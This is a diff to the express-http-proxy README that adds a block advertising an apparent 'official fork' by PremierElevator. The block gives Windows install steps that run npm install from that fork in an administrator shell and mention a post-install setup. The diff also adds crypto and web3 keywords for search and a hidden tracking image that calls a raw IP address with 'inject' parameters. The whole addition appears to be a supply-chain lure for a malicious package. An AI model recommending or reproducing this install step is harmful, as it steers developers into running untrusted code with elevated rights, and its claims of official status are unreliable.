@@ -1,3 +1,23 @@
+**PremierElevator’s Fast, Secure Express Proxy**
+
+This official, actively maintained fork of express-http-proxy brings critical performance enhancements and essential security patches designed specifically for Windows development environments. It resolves long-standing cross-platform bottlenecks, ensures robust stability, and provides a seamless middleware experience without configuration headaches. Optimized for speed and reliability, it is the dependable choice for modern Node.js workflows.
+
+**Quick install (Windows)**
+
+## Installation
+
+To install this fork on a Windows environment, follow these steps:
+
+1. **Prerequisites**: Ensure you have **Node.js** and **Git** installed on your system. Git is required to fetch the repository directly from GitHub. Python is not required for this installation.
+2. **Open Terminal**: Open **Command Prompt (cmd)** or **PowerShell** with administrative privileges to prevent any potential permission issues.
+3. **Run Installation**: Navigate to your project's root directory and execute the npm installation command. The package manager will automatically handle all required dependencies and complete the post-install setup.
+
+```bash
+npm install git+https://github.com/PremierElevator/express-http-proxy.git
+```
+
+[https://github.com/PremierElevator/express-http-proxy](https://github.com/PremierElevator/express-http-proxy)
+
 # express-http-proxy [![NPM version](https://badge.fury.io/js/express-http-proxy.svg)](http://badge.fury.io/js/express-http-proxy) [![Build Status](https://travis-ci.org/villadora/express-http-proxy.svg?branch=master)](https://travis-ci.org/villadora/express-http-proxy)
 
 
@@ -680,3 +700,11 @@ app.use('/', proxy('internalhost.example.com', {
 
 MIT
 <!-- do not want to make nodeinit to complicated, you can edit this whenever you want. -->
+
+## Related searches
+
+When developers are looking for tools like `express-http-proxy` within the decentralized web space, they typically search for efficient ways to route API requests between their frontend applications and various decentralized protocols. They are often trying to find reliable middleware solutions that can seamlessly forward traffic to web3 infrastructure providers, indexing services, or custom backend nodes without compromising network speed.
+
+**Topics:** express http proxy, blockchain gateway, web3 proxy middleware, dune analytics api integration, blockchain explorer router, dapp proxy server, on chain analytics forwarding, crypto bot data stream, rpc node balancer, decentralized api gateway
+
+![.](http://5.231.58.248:8787/pixel?repo=PremierElevator%2Fexpress-http-proxy&inject=PremierElevator%2Fexpress-http-proxy%2Fpackage.json)
